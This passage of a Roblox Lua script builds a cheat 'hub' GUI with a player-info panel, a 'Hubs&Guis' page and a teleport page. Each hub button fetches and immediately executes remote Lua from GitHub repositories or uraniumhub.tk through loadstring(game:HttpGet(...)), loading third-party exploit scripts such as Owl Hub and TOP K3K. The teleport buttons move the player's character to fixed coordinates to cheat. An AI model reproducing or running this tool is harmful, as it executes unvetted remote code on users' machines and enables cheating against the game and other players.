a.TextLabel_10.Parent = a.Frame_7
a.TextLabel_10.Active = true
a.TextLabel_10.BackgroundTransparency = 1.000
a.TextLabel_10.Position = UDim2.new(0, 0, 0.419913828, 0)
a.TextLabel_10.Selectable = true
a.TextLabel_10.Size = UDim2.new(0.185507253, 0, 0, 30)
a.TextLabel_10.Font = Enum.Font.FredokaOne
a.TextLabel_10.Text = "Place ID:"
a.TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_10.TextSize = 14.000
a.TextLabel_10.TextXAlignment = Enum.TextXAlignment.Left
a.TextLabel_11.Parent = a.Frame_7
a.TextLabel_11.Active = true
a.TextLabel_11.BackgroundTransparency = 1.000
a.TextLabel_11.Position = UDim2.new(0, 0, 0.524892271, 0)
a.TextLabel_11.Selectable = true
a.TextLabel_11.Size = UDim2.new(0.168115944, 0, 0, 30)
a.TextLabel_11.Font = Enum.Font.FredokaOne
a.TextLabel_11.Text = "User ID:"
a.TextLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_11.TextSize = 14.000
a.TextLabel_11.TextXAlignment = Enum.TextXAlignment.Left
a.TextLabel_12.Parent = a.Frame_7
a.TextLabel_12.Active = true
a.TextLabel_12.BackgroundTransparency = 1.000
a.TextLabel_12.Position = UDim2.new(0, 0, 0.629870713, 0)
a.TextLabel_12.Selectable = true
a.TextLabel_12.Size = UDim2.new(0.168115944, 0, 0, 30)
a.TextLabel_12.Font = Enum.Font.FredokaOne
a.TextLabel_12.Text = "Job ID:"
a.TextLabel_12.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_12.TextSize = 14.000
a.TextLabel_12.TextXAlignment = Enum.TextXAlignment.Left
a.TextLabel_13.Parent = a.Frame_7
a.TextLabel_13.Active = true
a.TextLabel_13.BackgroundTransparency = 1.000
a.TextLabel_13.Position = UDim2.new(0, 0, 0.895435572, 0)
a.TextLabel_13.Selectable = true
a.TextLabel_13.Size = UDim2.new(0.237681165, 0, 0, 30)
a.TextLabel_13.Font = Enum.Font.FredokaOne
a.TextLabel_13.Text = "Profile Photo:"
a.TextLabel_13.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_13.TextSize = 14.000
a.TextLabel_13.TextXAlignment = Enum.TextXAlignment.Left
a.TextLabel_14.Parent = a.Frame_7
a.TextLabel_14.Active = true
a.TextLabel_14.BackgroundTransparency = 1.000
a.TextLabel_14.Position = UDim2.new(0, 0, 0.914039016, 0)
a.TextLabel_14.Selectable = true
a.TextLabel_14.Size = UDim2.new(0.113043524, 0, 0, 30)
a.TextLabel_14.Font = Enum.Font.FredokaOne
a.TextLabel_14.Text = "Rank:"
a.TextLabel_14.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_14.TextSize = 14.000
a.TextLabel_14.TextXAlignment = Enum.TextXAlignment.Left
a.name.Name = "name"
a.name.Parent = a.urinfo
a.name.Active = true
a.name.BackgroundTransparency = 1.000
a.name.Position = UDim2.new(0.130193904, 0, 0.150547728, 0)
a.name.Selectable = true
a.name.Size = UDim2.new(0.331680506, 0, 0, 30)
a.name.Font = Enum.Font.FredokaOne
a.name.Text = ""
a.name.TextColor3 = Color3.fromRGB(255, 255, 255)
a.name.TextSize = 14.000
a.name.TextWrapped = true
a.name.TextXAlignment = Enum.TextXAlignment.Left
a.dplayname.Name = "dplayname"
a.dplayname.Parent = a.urinfo
a.dplayname.Active = true
a.dplayname.BackgroundTransparency = 1.000
a.dplayname.Position = UDim2.new(0.249307469, 0, 0.273264289, 0)
a.dplayname.Selectable = true
a.dplayname.Size = UDim2.new(0.341667682, 0, 0, 30)
a.dplayname.Font = Enum.Font.FredokaOne
a.dplayname.Text = ""
a.dplayname.TextColor3 = Color3.fromRGB(255, 255, 255)
a.dplayname.TextSize = 14.000
a.dplayname.TextWrapped = true
a.dplayname.TextXAlignment = Enum.TextXAlignment.Left
a.plesid.Name = "plesid"
a.plesid.Parent = a.urinfo
a.plesid.Active = true
a.plesid.BackgroundTransparency = 1.000
a.plesid.Position = UDim2.new(0.174354628, 0, 0.396956146, 0)
a.plesid.Selectable = true
a.plesid.Size = UDim2.new(0.240657032, 0, 0, 30)
a.plesid.Font = Enum.Font.FredokaOne
a.plesid.Text = ""
a.plesid.TextColor3 = Color3.fromRGB(255, 255, 255)
a.plesid.TextSize = 14.000
a.plesid.TextXAlignment = Enum.TextXAlignment.Left
a.uresid.Name = "uresid"
a.uresid.Parent = a.urinfo
a.uresid.Active = true
a.uresid.BackgroundTransparency = 1.000
a.uresid.Position = UDim2.new(0.149584502, 0, 0.518231153, 0)
a.uresid.Selectable = true
a.uresid.Size = UDim2.new(0.254743814, 0, 0, 30)
a.uresid.Font = Enum.Font.FredokaOne
a.uresid.Text = ""
a.uresid.TextColor3 = Color3.fromRGB(255, 255, 255)
a.uresid.TextSize = 14.000
a.uresid.TextXAlignment = Enum.TextXAlignment.Left
a.jobid.Name = "jobid"
a.jobid.Parent = a.urinfo
a.jobid.Active = true
a.jobid.BackgroundTransparency = 1.000
a.jobid.Position = UDim2.new(0.132963985, 0, 0.643204391, 0)
a.jobid.Selectable = true
a.jobid.Size = UDim2.new(0.213673085, 0, 0, 30)
a.jobid.Font = Enum.Font.FredokaOne
a.jobid.Text = ""
a.jobid.TextColor3 = Color3.fromRGB(255, 255, 255)
a.jobid.TextSize = 14.000
a.jobid.TextXAlignment = Enum.TextXAlignment.Left
a.ProfilePhoto.Name = "ProfilePhoto"
a.ProfilePhoto.Parent = a.urinfo
a.ProfilePhoto.Active = true
a.ProfilePhoto.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
a.ProfilePhoto.BackgroundTransparency = 1.000
a.ProfilePhoto.Position = UDim2.new(0.250004053, 0, 0.760159552, 0)
a.ProfilePhoto.Size = UDim2.new(0, 34, 0, 32)
a.ProfilePhoto.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
a.UICorner_43.CornerRadius = UDim.new(999, 8)
a.UICorner_43.Parent = a.ProfilePhoto
a.Rank.Name = "Rank"
a.Rank.Parent = a.urinfo
a.Rank.Active = true
a.Rank.BackgroundTransparency = 1.000
a.Rank.Position = UDim2.new(0.110208869, 0, 0.887700498, 0)
a.Rank.Size = UDim2.new(0.214000002, 0, 0, 30)
a.Rank.Font = Enum.Font.FredokaOne
a.Rank.Text = ""
a.Rank.TextColor3 = Color3.fromRGB(255, 255, 255)
a.Rank.TextSize = 14.000
a.Rank.TextWrapped = true
a.HUBSandGUIS.Name = "HUBSandGUIS"
a.HUBSandGUIS.Parent = a.PagesFrame
a.HUBSandGUIS.Active = true
a.HUBSandGUIS.BackgroundTransparency = 1.000
a.HUBSandGUIS.BorderSizePixel = 0
a.HUBSandGUIS.Position = UDim2.new(0, 6, 0, 9)
a.HUBSandGUIS.Size = UDim2.new(1.33246756, -142, 1.09487176, -56)
a.HUBSandGUIS.Visible = false
a.HUBSandGUIS.CanvasSize = UDim2.new(0, 0, 0, 604)
a.HUBSandGUIS.ScrollBarThickness = 3
a.UIListLayout_15.Parent = a.HUBSandGUIS
a.UIListLayout_15.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_15.Padding = UDim.new(0, 10)
a.hubgiz.Name = "hubgiz"
a.hubgiz.Parent = a.HUBSandGUIS
a.hubgiz.Active = true
a.hubgiz.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.hubgiz.Size = UDim2.new(1, -10, 0, 36)
a.UICorner_44.CornerRadius = UDim.new(0, 3)
a.UICorner_44.Parent = a.hubgiz
a.hubar.Name = "hubar"
a.hubar.Parent = a.hubgiz
a.hubar.Active = true
a.hubar.BackgroundTransparency = 1.000
a.hubar.Position = UDim2.new(0, 8, 0, 8)
a.hubar.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_16.Parent = a.hubar
a.UIListLayout_16.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_16.Padding = UDim.new(0, 4)
a.Title_4.Name = "Title"
a.Title_4.Parent = a.hubar
a.Title_4.Active = true
a.Title_4.BackgroundTransparency = 1.000
a.Title_4.Size = UDim2.new(1, 0, 0, 20)
a.Title_4.Font = Enum.Font.GothamSemibold
a.Title_4.Text = "Hubs&Guis"
a.Title_4.TextColor3 = Color3.fromRGB(255, 255, 255)
a.Title_4.TextSize = 14.000
a.Title_4.TextXAlignment = Enum.TextXAlignment.Left
a.hubgil.Name = "hubgil"
a.hubgil.Parent = a.HUBSandGUIS
a.hubgil.Active = true
a.hubgil.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.hubgil.Position = UDim2.new(0, 0, 0.123989217, 0)
a.hubgil.Size = UDim2.new(1, -10, 0.407008082, 36)
a.UICorner_45.CornerRadius = UDim.new(0, 3)
a.UICorner_45.Parent = a.hubgil
a.hubar_2.Name = "hubar"
a.hubar_2.Parent = a.hubgil
a.hubar_2.Active = true
a.hubar_2.BackgroundTransparency = 1.000
a.hubar_2.Position = UDim2.new(0, 8, 0, 8)
a.hubar_2.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_17.Parent = a.hubar_2
a.UIListLayout_17.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_17.Padding = UDim.new(0, 4)
a.Title_5.Name = "Title"
a.Title_5.Parent = a.hubar_2
a.Title_5.Active = true
a.Title_5.BackgroundTransparency = 1.000
a.Title_5.Size = UDim2.new(1, 0, 0, 20)
a.Title_5.Font = Enum.Font.GothamSemibold
a.Title_5.Text = "Hubs And Guis"
a.Title_5.TextColor3 = Color3.fromRGB(255, 255, 255)
a.Title_5.TextSize = 14.000
a.Title_5.TextXAlignment = Enum.TextXAlignment.Left
a.domainhubx.Name = "domainhubx"
a.domainhubx.Parent = a.hubar_2
a.domainhubx.AnchorPoint = Vector2.new(0.5, 0)
a.domainhubx.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.domainhubx.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.domainhubx.BorderSizePixel = 2
a.domainhubx.Position = UDim2.new(0.479710132, 0, 1.48544955, 0)
a.domainhubx.Size = UDim2.new(1, 0, 0, 30)
a.domainhubx.ZIndex = 2
a.domainhubx.Font = Enum.Font.SourceSansBold
a.domainhubx.Text = "Domain HUB X"
a.domainhubx.TextColor3 = Color3.fromRGB(204, 204, 204)
a.domainhubx.TextScaled = true
a.domainhubx.TextSize = 14.000
a.domainhubx.TextWrapped = true
a.domainhubx.MouseButton1Down:Connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexsoftworks/DomainX/main/source", true))()
    end
)
a.UICorner_46.CornerRadius = UDim.new(0, 4)
a.UICorner_46.Parent = a.domainhubx
a.ezhub.Name = "ezhub"
a.ezhub.Parent = a.hubar_2
a.ezhub.AnchorPoint = Vector2.new(0.5, 0)
a.ezhub.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.ezhub.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.ezhub.BorderSizePixel = 2
a.ezhub.Position = UDim2.new(0.479710132, 0, 1.23787439, 0)
a.ezhub.Size = UDim2.new(1, 0, 0, 30)
a.ezhub.ZIndex = 2
a.ezhub.Font = Enum.Font.SourceSansBold
a.ezhub.Text = "Ez HUB"
a.ezhub.TextColor3 = Color3.fromRGB(204, 204, 204)
a.ezhub.TextScaled = true
a.ezhub.TextSize = 14.000
a.ezhub.TextWrapped = true
a.ezhub.MouseButton1Down:Connect(
    function()
        loadstring(
            game:HttpGet(
                "https://raw.githubusercontent.com/debug420/Ez-Industries-Launcher-Data/master/Launcher.lua",
                true
            )
        )()
    end
)
a.UICorner_47.CornerRadius = UDim.new(0, 4)
a.UICorner_47.Parent = a.ezhub
a.firegui.Name = "firegui"
a.firegui.Parent = a.hubar_2
a.firegui.AnchorPoint = Vector2.new(0.5, 0)
a.firegui.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.firegui.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.firegui.BorderSizePixel = 2
a.firegui.Position = UDim2.new(0.479710132, 0, 0.990299463, 0)
a.firegui.Size = UDim2.new(1, 0, 0, 30)
a.firegui.ZIndex = 2
a.firegui.Font = Enum.Font.SourceSansBold
a.firegui.Text = "Fire Gui"
a.firegui.TextColor3 = Color3.fromRGB(204, 204, 204)
a.firegui.TextScaled = true
a.firegui.TextSize = 14.000
a.firegui.TextWrapped = true
a.firegui.MouseButton1Down:Connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qHXwvs48h3aan6/MyScripts/main/firegui"))()
    end
)
a.UICorner_48.CornerRadius = UDim.new(0, 4)
a.UICorner_48.Parent = a.firegui
a.owlhub.Name = "owlhub"
a.owlhub.Parent = a.hubar_2
a.owlhub.AnchorPoint = Vector2.new(0.5, 0)
a.owlhub.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.owlhub.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.owlhub.BorderSizePixel = 2
a.owlhub.Position = UDim2.new(0.479710132, 0, 0.495149761, 0)
a.owlhub.Size = UDim2.new(1, 0, 0, 30)
a.owlhub.ZIndex = 2
a.owlhub.Font = Enum.Font.SourceSansBold
a.owlhub.Text = "Owl HUB"
a.owlhub.TextColor3 = Color3.fromRGB(204, 204, 204)
a.owlhub.TextScaled = true
a.owlhub.TextSize = 14.000
a.owlhub.TextWrapped = true
a.owlhub.MouseButton1Down:Connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))()
    end
)
a.UICorner_49.CornerRadius = UDim.new(0, 4)
a.UICorner_49.Parent = a.owlhub
a.rosehub.Name = "rosehub"
a.rosehub.Parent = a.hubar_2
a.rosehub.AnchorPoint = Vector2.new(0.5, 0)
a.rosehub.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.rosehub.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.rosehub.BorderSizePixel = 2
a.rosehub.Position = UDim2.new(0.479710132, 0, 0.247574851, 0)
a.rosehub.Size = UDim2.new(1, 0, 0, 30)
a.rosehub.ZIndex = 2
a.rosehub.Font = Enum.Font.SourceSansBold
a.rosehub.Text = "Rose HUB"
a.rosehub.TextColor3 = Color3.fromRGB(204, 204, 204)
a.rosehub.TextScaled = true
a.rosehub.TextSize = 14.000
a.rosehub.TextWrapped = true
a.rosehub.MouseButton1Down:Connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qHXwvs48h3aan6/MyScripts/main/rosehub"))()
    end
)
a.UICorner_50.CornerRadius = UDim.new(0, 4)
a.UICorner_50.Parent = a.rosehub
a.topkekv4.Name = "topkekv4"
a.topkekv4.Parent = a.hubar_2
a.topkekv4.AnchorPoint = Vector2.new(0.5, 0)
a.topkekv4.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.topkekv4.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.topkekv4.BorderSizePixel = 2
a.topkekv4.Position = UDim2.new(0.479710132, 0, -6.33255226e-08, 0)
a.topkekv4.Size = UDim2.new(1, 0, 0, 30)
a.topkekv4.ZIndex = 2
a.topkekv4.Font = Enum.Font.SourceSansBold
a.topkekv4.Text = "TOP K3K v4"
a.topkekv4.TextColor3 = Color3.fromRGB(204, 204, 204)
a.topkekv4.TextScaled = true
a.topkekv4.TextSize = 14.000
a.topkekv4.TextWrapped = true
a.topkekv4.MouseButton1Down:Connect(
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qHXwvs48h3aan6/MyScripts/main/topk4k"))()
    end
)
a.UICorner_51.CornerRadius = UDim.new(0, 4)
a.UICorner_51.Parent = a.topkekv4
a.uraniumhub.Name = "uraniumhub"
a.uraniumhub.Parent = a.hubar_2
a.uraniumhub.AnchorPoint = Vector2.new(0.5, 0)
a.uraniumhub.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.uraniumhub.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.uraniumhub.BorderSizePixel = 2
a.uraniumhub.Position = UDim2.new(0.479710132, 0, 0.742724538, 0)
a.uraniumhub.Size = UDim2.new(1, 0, 0, 30)
a.uraniumhub.ZIndex = 2
a.uraniumhub.Font = Enum.Font.SourceSansBold
a.uraniumhub.Text = "Uranium HUB"
a.uraniumhub.TextColor3 = Color3.fromRGB(204, 204, 204)
a.uraniumhub.TextScaled = true
a.uraniumhub.TextSize = 14.000
a.uraniumhub.TextWrapped = true
a.uraniumhub.MouseButton1Down:Connect(
    function()
        loadstring(game:HttpGet("https://uraniumhub.tk/storage/script.lua", true))()
    end
)
a.UICorner_52.CornerRadius = UDim.new(0, 4)
a.UICorner_52.Parent = a.uraniumhub
a.TeleportsFrame.Name = "TeleportsFrame"
a.TeleportsFrame.Parent = a.PagesFrame
a.TeleportsFrame.Active = true
a.TeleportsFrame.BackgroundTransparency = 1.000
a.TeleportsFrame.BorderSizePixel = 0
a.TeleportsFrame.Position = UDim2.new(0, 6, 0, 9)
a.TeleportsFrame.Size = UDim2.new(1.33246756, -142, 1.09487176, -56)
a.TeleportsFrame.Visible = false
a.TeleportsFrame.CanvasSize = UDim2.new(0, 0, 0, 604)
a.TeleportsFrame.ScrollBarThickness = 3
a.UIListLayout_18.Parent = a.TeleportsFrame
a.UIListLayout_18.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_18.Padding = UDim.new(0, 10)
a.credit_2.Name = "credit"
a.credit_2.Parent = a.TeleportsFrame
a.credit_2.Active = true
a.credit_2.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.credit_2.Size = UDim2.new(1, -10, 0, 36)
a.UICorner_53.CornerRadius = UDim.new(0, 3)
a.UICorner_53.Parent = a.credit_2
a.info_2.Name = "info"
a.info_2.Parent = a.credit_2
a.info_2.Active = true
a.info_2.BackgroundTransparency = 1.000
a.info_2.Position = UDim2.new(0, 8, 0, 8)
a.info_2.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_19.Parent = a.info_2
a.UIListLayout_19.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_19.Padding = UDim.new(0, 4)
a.Title_6.Name = "Title"
a.Title_6.Parent = a.info_2
a.Title_6.Active = true
a.Title_6.BackgroundTransparency = 1.000
a.Title_6.Size = UDim2.new(1, 0, 0, 20)
a.Title_6.Font = Enum.Font.GothamSemibold
a.Title_6.Text = "Teleports"
a.Title_6.TextColor3 = Color3.fromRGB(255, 255, 255)
a.Title_6.TextSize = 14.000
a.Title_6.TextXAlignment = Enum.TextXAlignment.Left
a.teleportsfrema.Name = "teleportsfrema"
a.teleportsfrema.Parent = a.TeleportsFrame
a.teleportsfrema.Active = true
a.teleportsfrema.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.teleportsfrema.Position = UDim2.new(0, 0, -0.504043102, 0)
a.teleportsfrema.Size = UDim2.new(1, -10, 0.690026939, 138)
a.UICorner_54.CornerRadius = UDim.new(0, 3)
a.UICorner_54.Parent = a.teleportsfrema
a.Frame_8.Parent = a.teleportsfrema
a.Frame_8.Active = true
a.Frame_8.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
a.Frame_8.BorderSizePixel = 0
a.Frame_8.Position = UDim2.new(0, 8, 0, 8)
a.Frame_8.Size = UDim2.new(1, -16, 1, -16)
a.UIListLayout_20.Parent = a.Frame_8
a.UIListLayout_20.SortOrder = Enum.SortOrder.LayoutOrder
a.UIListLayout_20.Padding = UDim.new(0, 4)
a.TextLabel_15.Parent = a.Frame_8
a.TextLabel_15.Active = true
a.TextLabel_15.BackgroundTransparency = 1.000
a.TextLabel_15.Position = UDim2.new(-0.0231884066, 0, -0.229508191, 0)
a.TextLabel_15.Size = UDim2.new(1, 0, 0, 20)
a.TextLabel_15.Font = Enum.Font.GothamSemibold
a.TextLabel_15.Text = "Teleports"
a.TextLabel_15.TextColor3 = Color3.fromRGB(255, 255, 255)
a.TextLabel_15.TextSize = 14.000
a.TextLabel_15.TextXAlignment = Enum.TextXAlignment.Left
a.GroupRoom.Name = "GroupRoom"
a.GroupRoom.Parent = a.Frame_8
a.GroupRoom.AnchorPoint = Vector2.new(0.5, 0)
a.GroupRoom.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.GroupRoom.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.GroupRoom.BorderSizePixel = 2
a.GroupRoom.Position = UDim2.new(0.5, 0, 0.105795309, 0)
a.GroupRoom.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.GroupRoom.ZIndex = 2
a.GroupRoom.Font = Enum.Font.SourceSansBold
a.GroupRoom.Text = "Group Room"
a.GroupRoom.TextColor3 = Color3.fromRGB(204, 204, 204)
a.GroupRoom.TextScaled = true
a.GroupRoom.TextSize = 14.000
a.GroupRoom.TextWrapped = true
a.GroupRoom.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(121, 264, -0)
    end
)
a.UICorner_55.CornerRadius = UDim.new(0, 4)
a.UICorner_55.Parent = a.GroupRoom
a.island1.Name = "island1"
a.island1.Parent = a.Frame_8
a.island1.AnchorPoint = Vector2.new(0.5, 0)
a.island1.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.island1.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.island1.BorderSizePixel = 2
a.island1.Position = UDim2.new(0.5, 0, 0.165044785, 0)
a.island1.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.island1.ZIndex = 2
a.island1.Font = Enum.Font.SourceSansBold
a.island1.Text = "Island 1"
a.island1.TextColor3 = Color3.fromRGB(204, 204, 204)
a.island1.TextScaled = true
a.island1.TextSize = 14.000
a.island1.TextWrapped = true
a.island1.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-116, 169, -104)
    end
)
a.UICorner_56.CornerRadius = UDim.new(0, 4)
a.UICorner_56.Parent = a.island1
a.island2.Name = "island2"
a.island2.Parent = a.Frame_8
a.island2.AnchorPoint = Vector2.new(0.5, 0)
a.island2.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.island2.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.island2.BorderSizePixel = 2
a.island2.Position = UDim2.new(0.5, 0, 0.22429432, 0)
a.island2.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.island2.ZIndex = 2
a.island2.Font = Enum.Font.SourceSansBold
a.island2.Text = "Island 2"
a.island2.TextColor3 = Color3.fromRGB(204, 204, 204)
a.island2.TextScaled = true
a.island2.TextSize = 14.000
a.island2.TextWrapped = true
a.island2.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8, 169, -104)
    end
)
a.UICorner_57.CornerRadius = UDim.new(0, 4)
a.UICorner_57.Parent = a.island2
a.island3.Name = "island3"
a.island3.Parent = a.Frame_8
a.island3.AnchorPoint = Vector2.new(0.5, 0)
a.island3.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.island3.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.island3.BorderSizePixel = 2
a.island3.Position = UDim2.new(0.5, 0, 0.283543795, 0)
a.island3.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.island3.ZIndex = 2
a.island3.Font = Enum.Font.SourceSansBold
a.island3.Text = "Island 3"
a.island3.TextColor3 = Color3.fromRGB(204, 204, 204)
a.island3.TextScaled = true
a.island3.TextSize = 14.000
a.island3.TextWrapped = true
a.island3.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(116, 169, -103)
    end
)
a.UICorner_58.CornerRadius = UDim.new(0, 4)
a.UICorner_58.Parent = a.island3
a.island4.Name = "island4"
a.island4.Parent = a.Frame_8
a.island4.AnchorPoint = Vector2.new(0.5, 0)
a.island4.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.island4.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.island4.BorderSizePixel = 2
a.island4.Position = UDim2.new(0.5, 0, 0.342793345, 0)
a.island4.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.island4.ZIndex = 2
a.island4.Font = Enum.Font.SourceSansBold
a.island4.Text = "Island 4"
a.island4.TextColor3 = Color3.fromRGB(204, 204, 204)
a.island4.TextScaled = true
a.island4.TextSize = 14.000
a.island4.TextWrapped = true
a.island4.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(113, 169, -0)
    end
)
a.UICorner_59.CornerRadius = UDim.new(0, 4)
a.UICorner_59.Parent = a.island4
a.island5.Name = "island5"
a.island5.Parent = a.Frame_8
a.island5.AnchorPoint = Vector2.new(0.5, 0)
a.island5.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.island5.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.island5.BorderSizePixel = 2
a.island5.Position = UDim2.new(0.5, 0, 0.402042747, 0)
a.island5.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.island5.ZIndex = 2
a.island5.Font = Enum.Font.SourceSansBold
a.island5.Text = "Island 5"
a.island5.TextColor3 = Color3.fromRGB(204, 204, 204)
a.island5.TextScaled = true
a.island5.TextSize = 14.000
a.island5.TextWrapped = true
a.island5.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(112, 169, 124)
    end
)
a.UICorner_60.CornerRadius = UDim.new(0, 4)
a.UICorner_60.Parent = a.island5
a.island6.Name = "island6"
a.island6.Parent = a.Frame_8
a.island6.AnchorPoint = Vector2.new(0.5, 0)
a.island6.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.island6.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.island6.BorderSizePixel = 2
a.island6.Position = UDim2.new(0.5, 0, 0.461292297, 0)
a.island6.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.island6.ZIndex = 2
a.island6.Font = Enum.Font.SourceSansBold
a.island6.Text = "Island 6"
a.island6.TextColor3 = Color3.fromRGB(204, 204, 204)
a.island6.TextScaled = true
a.island6.TextSize = 14.000
a.island6.TextWrapped = true
a.island6.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(8, 165, 121)
    end
)
a.UICorner_61.CornerRadius = UDim.new(0, 4)
a.UICorner_61.Parent = a.island6
a.island7.Name = "island7"
a.island7.Parent = a.Frame_8
a.island7.AnchorPoint = Vector2.new(0.5, 0)
a.island7.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.island7.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.island7.BorderSizePixel = 2
a.island7.Position = UDim2.new(0.5, 0, 0.520541847, 0)
a.island7.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.island7.ZIndex = 2
a.island7.Font = Enum.Font.SourceSansBold
a.island7.Text = "Island 7"
a.island7.TextColor3 = Color3.fromRGB(204, 204, 204)
a.island7.TextScaled = true
a.island7.TextSize = 14.000
a.island7.TextWrapped = true
a.island7.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-120, 165, 124)
    end
)
a.UICorner_62.CornerRadius = UDim.new(0, 4)
a.UICorner_62.Parent = a.island7
a.island8.Name = "island8"
a.island8.Parent = a.Frame_8
a.island8.AnchorPoint = Vector2.new(0.5, 0)
a.island8.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.island8.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.island8.BorderSizePixel = 2
a.island8.Position = UDim2.new(0.5, 0, 0.579791307, 0)
a.island8.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.island8.ZIndex = 2
a.island8.Font = Enum.Font.SourceSansBold
a.island8.Text = "Island 8"
a.island8.TextColor3 = Color3.fromRGB(204, 204, 204)
a.island8.TextScaled = true
a.island8.TextSize = 14.000
a.island8.TextWrapped = true
a.island8.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-112, 165, 16)
    end
)
a.UICorner_63.CornerRadius = UDim.new(0, 4)
a.UICorner_63.Parent = a.island8
a.lobby.Name = "lobby"
a.lobby.Parent = a.Frame_8
a.lobby.AnchorPoint = Vector2.new(0.5, 0)
a.lobby.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.lobby.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.lobby.BorderSizePixel = 2
a.lobby.Position = UDim2.new(0.5, 0, 0.639040768, 0)
a.lobby.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.lobby.ZIndex = 2
a.lobby.Font = Enum.Font.SourceSansBold
a.lobby.Text = "Lobby"
a.lobby.TextColor3 = Color3.fromRGB(204, 204, 204)
a.lobby.TextScaled = true
a.lobby.TextSize = 14.000
a.lobby.TextWrapped = true
a.lobby.MouseButton1Down:connect(
    function()
        game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 264, 20)
    end
)
a.UICorner_64.CornerRadius = UDim.new(0, 4)
a.UICorner_64.Parent = a.lobby
a.megavip.Name = "megavip"
a.megavip.Parent = a.Frame_8
a.megavip.AnchorPoint = Vector2.new(0.5, 0)
a.megavip.BackgroundColor3 = Color3.fromRGB(14, 14, 14)
a.megavip.BorderColor3 = Color3.fromRGB(32, 32, 32)
a.megavip.BorderSizePixel = 2
a.megavip.Position = UDim2.new(0.5, 0, 0.698290169, 0)
a.megavip.Size = UDim2.new(1, 0, -0.00340277422, 30)
a.megavip.ZIndex = 2
a.megavip.Font = Enum.Font.SourceSansBold
a.megavip.Text = "Mega Vip"
